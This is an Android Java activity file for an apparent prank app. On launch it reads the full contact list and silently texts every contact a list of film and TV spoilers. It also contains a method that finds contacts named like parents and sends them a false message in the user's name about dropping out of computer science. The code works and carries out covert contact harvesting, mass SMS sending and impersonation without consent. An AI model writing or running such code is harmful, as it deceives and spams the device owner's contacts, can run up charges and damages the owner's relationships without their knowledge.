package com.example.phil.myapplication;

import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;

import java.util.ArrayList;

public class TextMessageActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_text_message);
        ArrayList<String> numbers = getPhoneNumbers();

        String message = "Whalter dies at the end of Breaking Bad, " +
                         "Kylo Ren is Ben Solo and kills Han Solo, " +
                         "Bruce Willis is dead in Sixth Sense, " +
                         "Snape kills Dumbledore in Harry Potter 6, " +
                         "Tyler Durden is imaginary in Fight Club, " +
                         "Darth Vader is Luke's father, " +
                         "The Island in Lost is actually hell.";

        for(int i = 0; i < numbers.size(); i++) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(numbers.get(i), null, message, null, null);
        }
    }

    public ArrayList<String> getPhoneNumbers() {
        ArrayList<String> numbers = new ArrayList<>();

        Cursor contacts =
                getContentResolver()
                .query(ContactsContract
                .CommonDataKinds
                .Phone.CONTENT_URI,null,null,null,null);
        while(contacts.moveToNext()) {
            String phoneNumber =
                    contacts
                    .getString(contacts
                    .getColumnIndex(ContactsContract
                    .CommonDataKinds.Phone.NUMBER));
            numbers.add(phoneNumber);
        }

        return numbers;
    }

    public void getParentsToDisownUser() {

        ArrayList<String> numbers = new ArrayList<>();
        Cursor phones =
                getContentResolver()
                        .query(ContactsContract
                                .CommonDataKinds
                                .Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext()) {
            String name = phones
                    .getString(phones
                            .getColumnIndex(ContactsContract
                                    .CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones
                    .getString(phones
                            .getColumnIndex(ContactsContract
                                    .CommonDataKinds.Phone.NUMBER));

            String message = "I am dropping out of cosci to become a theater major.";

            if (name.toLowerCase().contains("mom")
                    || name.toLowerCase().contains("mama")
                    || name.toLowerCase().contains("mother")
                    || name.toLowerCase().contains("dad")
                    || name.toLowerCase().contains("papa")
                    || name.toLowerCase().contains("father"))
            {

                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }

        }
        phones.close();
    }
}
